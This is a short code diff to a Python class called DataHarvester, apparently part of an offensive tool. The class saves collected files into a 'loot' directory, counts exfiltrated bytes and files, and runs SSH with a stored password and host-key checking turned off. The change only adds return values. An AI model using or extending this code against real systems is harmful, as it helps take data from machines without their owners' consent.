@@ -34,6 +34,9 @@ class DataHarvester:
             p=self.loot_dir/name;p.parent.mkdir(parents=True,exist_ok=True)
             p.write_text(content,errors='ignore')
             self.bytes_exfiltrated+=p.stat().st_size;self.files_exfiltrated+=1
+            return True
+        return False
+
 
     def ssh(self,cmd,timeout=30):
         return run_local(['sshpass','-p',self.password,'ssh','-o','StrictHostKeyChecking=no',
